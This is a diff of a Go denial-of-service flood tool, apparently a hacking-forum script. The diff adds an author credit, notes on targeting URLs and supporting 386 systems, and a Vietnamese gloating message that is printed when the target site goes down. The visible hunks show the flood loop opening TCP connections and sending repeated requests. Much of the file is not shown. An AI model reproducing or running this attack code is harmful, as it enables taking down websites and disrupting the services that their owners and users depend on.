@@ -1,4 +1,11 @@
-
+/*
+Coded by LeeOn123
+Please fking code ur script by ur self, kid.
+I changed the random integers range to the max of int32.
+Now 386 systems should work well.
+Looks like most people want to hit the url but not the host/ip.
+As a result, here you are.
+*/
 package main
 
 import (
@@ -188,7 +195,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("TuanCheatEngine - DDOS!") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("Web sập chắc rồi muhahah!!!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -254,7 +261,3 @@ func main() {
 		//time.Sleep( time.Millisecond * 1)
 	}
 	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
-	close(start)
-	time.Sleep(time.Duration(limit) * time.Second)
-	//Keep the threads continue
-}
